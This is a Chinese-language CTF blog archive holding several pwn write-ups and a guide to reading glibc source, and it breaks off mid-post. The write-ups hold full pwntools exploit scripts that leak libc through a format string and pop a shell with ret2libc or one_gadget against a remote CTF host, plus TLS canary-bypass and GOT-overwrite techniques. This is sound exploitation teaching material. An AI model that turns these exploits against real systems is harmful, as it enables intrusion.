id="关于上文出现问题的解释：">关于上文出现问题的解释：</h2><blockquote><p>如果修改了某个函数的got表（至于修改成什么不重要），现在想要使用这个被修改的got表（也就是被修改成的内容）。到最后执行ret指令时，（栈顶的内容）应该用plt地址来衔接，还是用got地址来衔接？</p><p><strong>ret指令，也就是pop rip</strong>，也就是把栈顶的内容（这里要尤其注意，我强调的是<strong>栈顶的内容</strong>）直接弹给rip，如果衔接got地址是什么情况？把一个跳板放到ret里？这个跳板什么都做不了**，跳板，顾名思义，只能被别人踩在下面跳到别人想跳的地址，它自身没有什么意义**。</p><p>如果放入plt地址呢？既然是修改了got表，也就是说肯定是进行延迟绑定了，<strong>执行那个函数plt表的第一条指令，jmp ptr【got地址】，此时去跳到了跳板指向的地方（也就是被修改的got表）</strong>，此时才能完成我们想要的要求。</p></blockquote><h2 id="pwntools中的一个未解之谜">pwntools中的一个未解之谜</h2><p>这里是当时踩的一个坑，至今未能找出原因，在此记录一下。</p><p>上面提到要找到无用函数在libc中的偏移，我最开始采用的是这个方法</p><p><img src="../img/2706180-20220426103817080-960601662.png" alt=""></p><p>但是得到的close函数在libc中的偏移是不正确的，这一点很奇怪。</p><p>这里我记录一下排查这个问题的方法。<strong>先查看一下libc基地址，然后用gdb看一下close延迟绑定之后的真实地址，二者相减看是否是打印出来的close函数在libc中的偏移。显然用这个方法测试之后的偏移是不一样的。此时才意识到上图的方法并不能打印出来正确的close偏移。</strong></p><p><strong>解决方法①：</strong></p><p>gdb动态调试看一下，它的真实地址</p><p><img src="../img/2706180-20220426103846637-587580728.png" alt=""></p><p>然后再用gdb看下，libc的基地址</p><p><img src="../img/2706180-20220426103859734-1715666525.png" alt=""></p><p>二者相减，拿到close在libc中的偏移</p><p><strong>解决方法②：</strong></p><p>使用命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">readelf --symbols /lib/x86_64-linux-gnu/libc.so.6 | grep &#x27;mprotect&#x27;</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220426103934059-170044952.png" alt=""></p><p>或者</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep &#x27;_close&#x27;</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220426104003427-537650546.png" alt=""></p><p>但是用objdump有时候似乎搜的不太对，反正搜libc中函数偏移的时候，尽量使用readelf命令</p><h2 id="关于打本地时监听端口的一个小坑">关于打本地时监听端口的一个小坑</h2><p>当脚本写完之后，运行的时，我又踩到了最后一个坑。</p><p>这个脚本现在是将flag的数据读到了socket上然后将其发送到connect连接到的端口上，我们想接收这个数据就必须先监听这个端口，然后等待数据发送过来。</p><p><img src="../img/2706180-20220426102522302-1487885126.png" alt=""></p><p>这是我最开始采用的nc -l 1000监听的方式，此时是没有任何数据过来的，最重要的是，connect压根就没有连接到这个端口上(换句话说此时压根都没有监听到这个端口），经过疯狂的调试观察（因为原本是不知道哪的问题，只能从脚本里面一点一点查）依旧没有解决，最后询问学长发现，是监听的参数有问题，下去之后通过查询nc的使用手册发现</p><p><img src="../img/2706180-20220426102531360-796579110.png" alt=""></p><p><strong>参数l开启监听模式，参数p才是指定端口（我的问题就是压根就没指定端口，就直接输入了个1000），参数v是详细打印</strong>（一个v是稍微详细，两个v是显示的更详细，不知道这个详细和更详细是啥意思的话，自己试试就知道了）</p><p>这是正常的情况<br><img src="../img/2706180-20220426102540992-803595367.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> orw </tag>
            
            <tag> magic_gadget </tag>
            
            <tag> shellcode </tag>
            
            <tag> socket+connect </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc中的源码该怎么读</title>
      <link href="/posts/aec37d93.html"/>
      <url>/posts/aec37d93.html</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面：">写在前面：</h2><p>在PWN的学习过程中，阅读glibc的源代码是一项必备的技能。一方面而言有些问题需要深入到源码中寻找答案，另一方面阅读源码来探究glibc中函数的实现是再合适不过的方法(有很多师傅做了优秀的总结，可不论怎么阅读他人的总结还是不如自己去实际的探究一下)，最后一方面，在不断探究和学习源码的过程中其实也在不断的进步并打下基础，如此看来阅读glibc中的源码百利而无一害。但我对于第一次尝试阅读源码的印象颇深，无从下手，不知所措。于是乎我写下了这篇文章，来向当初和我一样入门的师傅们提供一些经验和建议。</p><p><strong>由于本人水平有限，提供的思路和建议未必是最好的，但应该是当下在我的认知中对我而言是最合适的了。如果有错误或更方便的做法，师傅们也可以提出来。</strong></p><h2 id="1、准备环境-工具-源码">1、准备环境&amp;工具&amp;源码</h2><p>我们需要先把环境和工具准备好，这个其实很好搞。</p><p>我们需要去搞一下gdb源码调试的这个功能，尤其是在初学的时候，源码基本每行都看不懂(至少当时我是这样hhh)，那就必须要配合着gdb动态调试看源码了，这样我们可以去看一些变量的值，以及程序的走向又或者函数的调用关系等等。对于最初的萌新来说，这样就舒服很多了。</p><p>如何搭建gdb源码调试的环境可以看我的这篇文章  <a href="https://www.cnblogs.com/ZIKH26/articles/16150232.html">here</a></p><p>其次就是工具，工具的话建议选择vscode，这个具体咋搞就百度吧。</p><p>最后源码在这里下载</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://launchpad.net/ubuntu/+source/glibc/</span><br></pre></td></tr></table></figure><p>里面有很多个版本的glibc，如果没有特殊需要的话最好下载2.23-0ubuntu3这个版本。</p><p>最后打开vscode，将刚才下载的glibc的文件打开(说实话正常的话下面两张图片没必要放，因为现在在我看来这些步骤应该是理所当然，但我初学的时候其实连这个都不知道，也算是给曾经的自己看一下吧)</p><img src="https://s2.loli.net/2022/08/13/95XpLcSAPbKHMWI.png" alt="image-20220812222510249" style="zoom:50%;" /><p>glibc中的文件有很多，选择我们需要分析的那个函数所在的文件夹即可。比如我要分析fopen函数，那就打开这个libio这个文件(想知道函数在哪个文件夹的话，百度一下即可)</p><p><img src="https://s2.loli.net/2022/08/13/ObFPWU6IGCpvHun.png" alt="image-20220812222621903"></p><h2 id="2、vscode的一些快捷键">2、vscode的一些快捷键</h2><p>要说分析源码，不得不提的就是一些快捷键。使用快捷键和不使用快捷键的效率简直天差地别。</p><p>假设我现在在分析代码的1352行，这里出现了_IO_default_xsputn函数，如果我们要查看该函数定义的地方的话，ctrl+左键点击该函数，即可跳转到定义的地方。(如下图)</p><p><img src="https://s2.loli.net/2022/08/13/cELKu7FjeRkxwvC.png" alt="image-20220812223435147"></p><p>下图是我们已经跳转到函数定义的地方了，但是有一个很难受的事情就是，如果我们想回去刚才的代码继续分析还要手动再找回去么？ 我们可以使用快捷键Alt加&lt;-键(这个&lt;-键就是键盘里那个上下左右键的左)返回到刚刚的代码，同理Alt加-&gt;键可以再回到函数定义的地方。</p><img src="https://s2.loli.net/2022/08/13/CRyAYrdj6JwGsQp.png" alt="image-20220812223643803" style="zoom:50%;" /><p>ctrl+f是在当前文件搜索指定的内容</p><p>ctrl+z就是撤回刚刚的一步操作</p><h2 id="3、宏-如何溯源解决问题">3、宏&amp;如何溯源解决问题</h2><p>在glibc源码分析中，宏定义十分常见(如果不知道什么是宏可以百度一下)</p><p>有可能你眼前这个陌生的东西就是个宏。(初学的时候，我看源码一脸懵，心想咋这么多东西我都没见过，我学的假的c语言么？)</p><p>以下面432这行代码为例：</p><p>发现上来就是一个_IO_size_t干懵萌新，因为之前没见过啊。</p><p><img src="https://s2.loli.net/2022/08/13/jeMiwLNGrAVnbHT.png" alt="image-20220812224439901"></p><p>我们ctrl+左键溯源一下这个_IO_size_t(如下图)，发现是个宏定义，不过size_t还是没见过呀，那就继续溯源</p><p><img src="https://s2.loli.net/2022/08/13/AC95BZto1L7rNge.png" alt="image-20220812224614100"></p><p>发现最终是typedef给unsigned __int64新定义了一个名字叫做size_t（不清楚typedef的请自行百度）</p><p><img src="https://s2.loli.net/2022/08/13/D1iZ68ECtof495l.png" alt="image-20220812224707086"></p><p>这下子unsigned int64我们认识了，这不就是无符号整形变量么，ok问题解决，最初的那行代码其实就是unsigned int64 count 定义了count这个变量，仅此而已。</p><p>下面放一个我初学时的问题，下面这个结构体Elf32_Sym为什么是16字节？(我在这里并不是想表达这个结构体是多大，<strong>我是想强调我们在面对不会的问题的时候，解决的思路应该如何</strong>)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word   st_name;      <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr   st_value;     <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word   st_size;      <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;      <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_other;     <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section    st_shndx;     <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><p>这似乎是在定义变量？ 可是没听过Elf32_Word是个变量类型啊。</p><p>鼠标右键一下（我当时用的是VisualStudio ，发现是有个转到定义的，就说明这个Elf32_Word也是个被定义的东西</p><img src="https://s2.loli.net/2022/08/13/TXZfAaqK5Cg3D2l.png" alt="image-20220301130300184" style="zoom:33%;" /><p>到定义那里看一下发现了typedef这个东西和uint32_t，奈何c的基础不牢，google一下。</p><p><img src="https://s2.loli.net/2022/08/13/QmLDs2RXeESOtof.png" alt="image-20220301130416557"></p><p>发现了这个东西其实就是类似于提供了一个自定义类型的功能，举个例子，typedef unsigned int ai;</p><p>那么此时的ai就相当于unsigned int这个东西了，因此比如我们想定义一个unsigned int类型的变量b，就可以写成这样了，ai b;此时的效果是和unsigned int b;效果是一样的</p><p>那么这个uint32_t又是什么呢？继续google。</p><p>发现了这个uint32_t的这个_t的意思是这些数据类型（指的是uint32_t,而并非Elf32_Word）是通过typedef来定义的，而不是新的数据类型。也就是说，他们其实是我们已知的类型的别名。</p><p>然后下面这些就是这些数据类型被定义的地方</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">ifndef</span> __int8_t_defined  </span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __int8_t_defined  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">signed</span> <span class="type">char</span> <span class="type">int8_t</span>;</span><br><span class="line"><span class="keyword">typedef</span><span class="type">short</span> <span class="type">int</span> <span class="type">int16_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> <span class="type">int32_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> __WORDSIZE == 64  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">int</span> <span class="type">int64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span>  </span></span><br><span class="line">__extension__</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="type">int64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> <span class="type">uint8_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> <span class="type">uint16_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">ifndef</span> __uint32_t_defined  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">uint32_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __uint32_t_defined  </span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> __WORDSIZE == 64  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> <span class="type">uint64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span>  </span></span><br><span class="line">__extension__</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="type">uint64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br></pre></td></tr></table></figure><p>如此再回到这行代码  Elf32_Wordst_name，其实它就等同于unsigned int st_name，此时应该就能够看懂了。</p><p>最后回到最开始的那个问题，为什么这个结构是16字节？</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word   st_name;      <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr   st_value;     <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word   st_size;      <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;      <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_other;     <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section    st_shndx;     <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><p>因为分别查看了定义类型发现Elf32_Word和Elf32_Addr都是unsigned int类型，这个类型是4个字节，而unsigned char是1个字节，而查看了Elf32_Section发现它是被uint16_t定义的，而uint16_t则是unsigned short int类型，为2个字节。因此整个结构体为16字节。</p><p><strong>上面两个示例都提供了解决问题的基本思考方式，希望对师傅们有帮助</strong></p><h2 id="4、分析一个函数源码首先应该做的是什么？">4、分析一个函数源码首先应该做的是什么？</h2><p>我这里提供一个初学者最开始分析源码的一个思路。</p><p>以我最初分析fopen函数源码为例，首先肯定是要把vscode打开，确保自己手里有一份源码(而非只看某篇文章出现的源码)，然后先用gdb去调试，这次调试看什么？对于初学者而言，第一次应该是啥都看不懂，那也要硬着头皮把整个函数的汇编指令都si给执行一遍(就最起码对整个函数调用的函数数量，哪些出现频率高的函数起码有个印象)，然后第二次在把整个函数的汇编指令都si给执行一遍，这次去观察并记录期间调用的函数关系(最好是拿图画下来)，看不懂函数关系也没事，但至少要去画一遍或者写一遍。(就如下图这样)</p><p><img src="https://s2.loli.net/2022/08/13/LTdExvIBYAWhaeZ.png" alt="image-20220813082114252"></p><p>现在我们已经通过自己的调试有了一份“地图”，然后开始对着vscode源码开始从头分析。因为刚开始肯定有很多地方都不懂，那我们所谓的分析就会变的异常困难，<strong>我们可以先试着预测函数的走向以及执行后可能的结果。</strong></p><p>举个最简单的例子:</p><p>下面的代码就是fopen函数的最开始部分，发现在69行执行了malloc函数，那我们就可以<s>猜测</s>推断__fopen_internal函数就会调用malloc函数，而malloc申请的内存大小应该是locked_FILE结构体的大小，而返回的地址则给了new_f。(如下图)</p><img src="https://s2.loli.net/2022/08/13/89enG1XHJkFdirb.png" alt="image-20220813082708464" style="zoom:50%;" /><p>因为是初学时的源码分析，我们并不能保证百分百是这样的，那我们就用动态调试来看看是不是这样的，发现动态调试到这里，确实执行到了这里。</p><p><img src="https://s2.loli.net/2022/08/13/HSQ13JrKZWyxwER.png" alt="image-20220813083404379"></p><p>我们执行这行代码后再看下locked_FILE结构体的大小(如下)，因此判断申请的堆块大小最终为0x231(0x220+0x10+0x1)</p><p><img src="https://s2.loli.net/2022/08/13/wyGRTcgW2NbDqmu.png" alt="image-20220813083513162"></p><p><img src="https://s2.loli.net/2022/08/13/AJKH4MogpXh3GtS.png" alt="image-20220813083643376"></p><p>而new_f的值应该是malloc返回的堆块的用户区地址。(如下)</p><p><img src="https://s2.loli.net/2022/08/13/iMSIPThdeqc16U2.png" alt="image-20220813083753980"></p><p>至此我们就完成了一次最简单的验证。</p><p>而之后的流程也大致如此，先看源码分析，如果源码看懂了那就配合动态调试看看是否是自己分析的那样，如果源码没看懂，就直接动态调试看看函数是怎么执行的。对于初学者而言刚开始可能会比较困难，可以去网上找一些师傅已经做过的源码分析来作为参考，这样遇到实在分析不懂的地方，就看看其他师傅是怎么分析的。</p><h2 id="5、善于用搜索引擎">5、善于用搜索引擎</h2><p>现在许多常见的问题其实很多都可以在师傅们的文章中找到答案，如果遇到自己不会的问题，可以尝试在百度或者google上搜索(如果有条件的话，最好还是用google)。</p><h2 id="6、总结函数的调用流程">6、总结函数的调用流程</h2><p>为了确保自己是真的熟悉了函数整个的调用流程，建议调试过之后，自己在不看源码的情况下，将函数的调用流程总结一遍。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>good_luck_2022DASCTF Apr X FATE 防疫挑战赛</title>
      <link href="/posts/3aec74c5.html"/>
      <url>/posts/3aec74c5.html</url>
      
        <content type="html"><![CDATA[<h2 id="总结：">总结：</h2><p>通过这道题的学习与收获有：</p><p>1、学习了格式化字符串漏洞中的%s泄露函数地址原理以及roderick师傅写的Libcbox的用法（其实用法也很简单了），之后就没什么了直接ret2libc就打了。</p><p>2、这道赛题最后只有三解… 不过真的很简单，做出来的人很少的原因估计是因为这道题是比赛还有不到两个小时结束，才把正确的程序放出来（之前放的都是错误的…）。</p><h2 id="保护策略：">保护策略：</h2><p><img src="../img/2706180-20220424083159297-1342905454.png" alt=""></p><h2 id="程序分析：">程序分析：</h2><p><img src="../img/2706180-20220424083208729-652924904.png" alt=""></p><p><img src="../img/2706180-20220424083214353-1731248574.png" alt=""></p><p>程序逻辑非常简单，刚开始是time加srand加rand。看一下汇编代码发现没有办法覆盖种子，因此这里生成的就是一个不可控随机数。比赛刚开始的时候，程序放出来的是rand%200，因此进入fmt和overflow函数还需要进行爆破。不过现在这个就非常简单了，要么随机数是0要么随机数是1,0进入overflow,1进入fmt函数。</p><p><img src="../img/2706180-20220424083219157-376928583.png" alt=""></p><p>发现这两个函数都存在溢出，并且fmt函数中存在格式化字符串漏洞。由于程序没有开canary。那直接ret2libc？这样的话这个格式化字符串漏洞岂不是就没有意义了？先不管这么多，脚本写了再说。</p><p>写完之后发现打不通（之前写ret2libc的脚本给删了，这里就不再呈现了），通过调试发现，pop rdi的地址中出现了0a，把输出给截断了… 这意味着我们无法使用程序里的pop rdi。这样的话就没法泄露函数（毕竟我们连rdi寄存器都控制不了）</p><p>然后考虑一下给的格式化字符串漏洞，我们可以用它来泄露栈中存放的函数真实地址，利用溢出来劫持程序执行流。</p><p>泄露的话有两种方法，第一种是用%p泄露，第二种是用%s泄露。之前一直不清楚它们的区别，请教了roderick师傅之后总算是清楚了。</p><p>以printf(“%s”，“aaaa”)为例 printf的第二个参数装的并不是aaaa这四个字符，而是aaaa字符串的首地址。可是最后打印出来的并不是aaaa字符串的首地址，而是这个地址所指向的字符串。由此可以推断出，%s有寻址的功能。</p><h2 id="大致思路：">大致思路：</h2><p>思路重新回到泄露栈中的函数真实地址，先说第一种%p进行泄露。</p><p><img src="../img/2706180-20220424083227872-1671747977.png" alt=""></p><p>栈顶偏移25(0x13+6),因此直接%25$p即可。不过这样泄露出来的地址还需要减去362，因为现在得到的是puts+362，而我们仅仅要的是puts的真实地址。这样的缺点就是程序patch不同的libc，这个偏移是不一样的。以本题为例，题目并没有给出libc.so因此这个偏移我们是无法确定的(现在看到的只是我们本地的偏移，远程可能并不一样)。</p><p>不过这个方法有一定的运气成分在这里面，我猜这个版本不会太高（我本机是2.27的，当时本地通了远程没通，就知道肯定是libc patch的有问题），就从2.23开始patch libc。结果patch第一个2.23-0ubuntu11.3_amd64就被我给猜对了（服务器那边用的也是这个libc）。</p><p>这个libc蒙对之后，由于基地址也泄露出来了，剩下的就简单多了，本地怎么打，远程就怎么打(不过讲这个方法感觉没什么意义，毕竟这是靠运气（不过如果远程给了Libc的话这个方法是可以用的）主要我确实是用这个方法打通了，因此记录一下)</p><h2 id="exp1">exp1</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    p = remote(<span class="string">&#x27;39.99.242.16&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;/home/hacker/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line">    fmt_addr = <span class="number">0x400836</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;fmt\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;%25$p&#x27;</span> + (<span class="number">0x78</span> - <span class="number">5</span>) * <span class="string">&#x27;a&#x27;</span> + p64(fmt_addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_addr1---------------&gt;&#x27;</span>, <span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    libc_base = leak_addr - <span class="number">362</span> - <span class="number">0x6F6A0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">    pop_rdi_addr = <span class="number">0x21112</span> + libc_base</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    ret = <span class="number">0x400679</span></span><br><span class="line">    payload = <span class="number">0x78</span> * <span class="string">&#x27;b&#x27;</span></span><br><span class="line">    payload+=p64(ret)+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(sys_addr)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><p>这个打通概率是二分之一，因为如果第一次进到overflow就不通了。<br><img src="../img/2706180-20220424083229618-61437671.png" alt=""></p><p>第二种用%s来泄露就靠谱多了，我们在栈中布置puts的got地址，利用%s的寻址特征，来达到直接泄露puts的真实地址（也就是不会再受libc版本导致偏移不同的影响），依旧利用溢出来劫持程序执行流。</p><p>只需要输入%7$saaaa’ + p64(puts_got_addr)然后填垃圾数据垫到返回地址处劫持执行流即可。</p><p>这里泄露是很方便，但是我用LibcSearcher搜不到对应正确的libc版本。可以用<a href="https://libc.blukat.me/?q=puts%3A680&amp;l=libc6-amd64_2.10.1-0ubuntu15_i386">在线搜libc的网站搜</a>对应的Libc版本</p><p>也可以用Roderick师傅写的<a href="https://github.com/RoderickChan/pwncli">pwncli</a>中的LibcBox来搜，这个LibcBox写的确实很棒</p><p>下面是LibcBox搜索的效果图</p><p><img src="../img/2706180-20220424083235121-282534386.png" alt=""></p><p>它搜到了十个版本的libc，但是LibcSearcher我记的仅仅是搜到了三个（不排除是我的LibcSearcher有问题）。</p><p>泄露出了libc基地址，那就随便打了，不过好像没法搜pop_rdi这个指令（不过可以把libc下载下来用Ropgadget来搜，不过有点麻烦），就直接用one_gadget打了(pwncli这个库模式只支持python3)</p><h2 id="exp2">exp2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    p = remote(<span class="string">&#x27;39.99.242.16&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">    over_flow = <span class="number">0x400836</span></span><br><span class="line">    puts_got_addr = <span class="number">0x601018</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;fmt\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;%7$saaaa&#x27;</span> + p64(puts_got_addr) + (<span class="number">0x78</span> - <span class="number">16</span>) * <span class="string">b&#x27;a&#x27;</span> + p64(over_flow)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#用%s泄露出来的地址应该用u64来接收</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;puts_addr---------------&gt;&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    lb = LibcBox()</span><br><span class="line">    lb.add_symbol(<span class="string">&#x27;puts&#x27;</span>, puts_addr)<span class="comment">#这个地方跟libcsearcher用法基本一样，下面也是去dump出来</span></span><br><span class="line">    lb.search(download_so=<span class="number">1</span>)</span><br><span class="line">    libc_base = puts_addr - lb.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">    one_addr = <span class="number">0xf03a4</span> + libc_base</span><br><span class="line">    payload = <span class="number">0x78</span> * <span class="string">b&#x27;b&#x27;</span> + p64(one_addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> 格式化字符串漏洞 </tag>
            
            <tag> 栈对齐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gyctf_2020_bfnote</title>
      <link href="/posts/2d29ef23.html"/>
      <url>/posts/2d29ef23.html</url>
      
        <content type="html"><![CDATA[<h2 id="总结">总结</h2><p>通过本题的学习与总结有:</p><ol><li>本题与starctf2018_babystack这题一样，考察的都是篡改TLS中的stack_guard从而绕过canary的检查，因为在2.23和2.27 32位的glibc里面主线程的TLS是位于mmap映射出来的内存，并且位置固定并不随机。而本题可以通过数组索引无限制，而在mmap映射出来的区域精准的修改某个内存，这就给了篡改TLS中的stack_guard的机会</li><li>本题的难点在于之后绕过canary，无法正常的泄露libc地址，从而造成了一定难度，通过学习网上各位师傅的wp，发现本题一共有三种做法，分别是利用magic gadget篡改got表，ret2dl以及攻击IO_FILE。这里我采用的是利用magic gadget篡改got表</li></ol><h2 id="保护策略">保护策略</h2><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281654944.png" alt="image-20221128165410736" style="zoom:50%;" /><h2 id="漏洞所在">漏洞所在</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281657108.png" alt="image-20221128165734005"></p><h2 id="利用思路">利用思路</h2><p>我们现在拥有栈溢出控制执行流的机会，以及利用索引无限制任意地址写的机会。</p><p>先说如何劫持TLS里的stack_guard来绕过canary</p><ol><li>先利用malloc申请一个超大内存，观察一下mmap映射出来的地址和TLS中stack_guard的距离</li><li>在最后的数组索引无限制的read里去篡改stack_guard保持其和栈里覆盖掉的canary一样即可</li></ol><p>如图</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281712774.png" alt="image-20221128171243112" style="zoom:50%;" /><p>考虑到在数组里索引又被加了0x10，所以最后实际的偏移应该为0x5170c-0x10，这样即可篡改stack_guard(如下)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281714096.png" alt="image-20221128171415975"></p><p>由于本题的保护是parital relro，可以篡改got表。并且libc地址的后三位是固定不变的，其实我们可以打一个rop去read往atol的got表里读入数据(atol和system的真实地址只有后五位不一样)如下</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281718462.png" alt="image-20221128171802376" style="zoom:50%;" /><p>所以我们可以直接去read读入数据控制atol的后两位为system的地址，此时也仅仅有三位不一样了，到这里爆破一下的话也有1/4096的概率(如果实在没办法的话，爆破一下也不是不行)。</p><p>但是我们去观察一下可用的gadget发现了这个inc指令(如下)</p><blockquote><p>inc b相当于add b,1，速度比add指令更快</p></blockquote><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281720294.png" alt="image-20221128172035296"></p><p>同时看了一下关于ebp的gadget发现能够控制ebp(如下)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281722465.png" alt="image-20221128172221197"></p><p>这就意味着我们能利用那段magic gadget来让指定的内存加1，因为紧跟ret的存在，所以能够不断执行这段gadget，而atol和system除去末尾的三位固定外，前面的部分虽然随机但是却存在固定的偏移，我们可以控制ebp-0x17fa8b40为atol函数的第三字节的地址，不断的执行inc指令，最终加到和system一样的值。</p><p>篡改成功后让执行流迁移到0x08048656这个地址，read读入/bin/sh调用atol的时候获取shell。</p><h2 